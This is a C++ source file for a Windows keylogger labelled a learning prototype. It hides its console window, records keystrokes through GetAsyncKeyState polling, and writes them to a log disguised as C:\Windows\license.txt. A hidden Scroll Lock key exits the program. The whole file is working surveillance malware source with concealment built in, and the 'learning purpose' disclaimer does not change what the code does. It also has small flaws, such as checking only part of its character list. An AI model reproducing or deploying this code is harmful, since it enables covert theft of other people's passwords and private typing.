#include "stdafx.h"
#include <fstream>
#include <string>
#include <sstream> 
#include <iostream>
#include <windows.h>

// Key logger prototype
// Written by Jae Sung, Song
// I purposely did not implement dll injection 
// so that this code can't be used to commit crime
// THIS IS ONLY FOR LEARNING PURPOSE
using namespace std;

//global variables
ofstream out;
string buffer;
int counter;
bool doubleShift = false;

void keylist(char key);

int _tmain(int argc, _TCHAR* argv[])
{
	// Hide
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	char chType[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz";
	//array for every important character key
	int shift = 0;
	int scheck = 0;

	while (1 == 1){
		for (int i = 0; i<36; i++)
			keylist(chType[i]);

		if (GetAsyncKeyState(VK_SPACE))
		{
			buffer.append(" ");
			doubleShift = false;
		}

		if (GetAsyncKeyState(VK_RETURN))
		{
			buffer.append("\n");
			doubleShift = false;
		}
		if (GetAsyncKeyState(VK_BACK)){
			buffer.append("[BACKSPACE]");
			doubleShift = false;
		}
		if (GetAsyncKeyState(VK_SHIFT))
		{
			// Attempting to check if use is pressing shit function
			if (!(doubleShift)){
				cout << "Shift detected " << endl;
				buffer.append("[SHIFT]");
				doubleShift = true;
			}
		}

		if (GetAsyncKeyState(VK_CAPITAL))
		{
			cout << "CAPS detected" << endl;
			doubleShift = false;
			if (shift == 0){
				buffer.append("[CAPITAL]");
				shift++;
			}
			else{
				buffer.append("[/CAPITAL\]");
				shift--;
			}
		}
		// Reading Numbers
		if (GetAsyncKeyState(VK_NUMPAD0)){
			buffer.append("0");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD1)){
			buffer.append("1");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD2)){
			buffer.append("2");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD3)){
			buffer.append("3");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD4)){
			buffer.append("4");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD5)){
			buffer.append("5");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD6)){
			buffer.append("6");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD7)){
			buffer.append("7");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD8)){
			buffer.append("8");
			doubleShift = false;
		}
		else if (GetAsyncKeyState(VK_NUMPAD9)){
			buffer.append("9");
			doubleShift = false;
		}
		//Hide log file
		out.open("C:\\Windows\\license.txt", ios::app);
		out << buffer;
		buffer = "";
		//flush
		out.close();
		counter = 0;

		//every 100 ms
		Sleep(230);

		//Hidden Exit function
		if (GetAsyncKeyState(VK_SCROLL)){
			break;
		}
	}
}	


//checking for character
void keylist(char key)
{
	//check if the user presses a key
	if (GetAsyncKeyState(key))
	{
		stringstream ss;
		string skey;
		ss << key;
		ss >> skey;
		cout << key << endl;
		doubleShift = false;
		buffer.append(skey);
	}
}

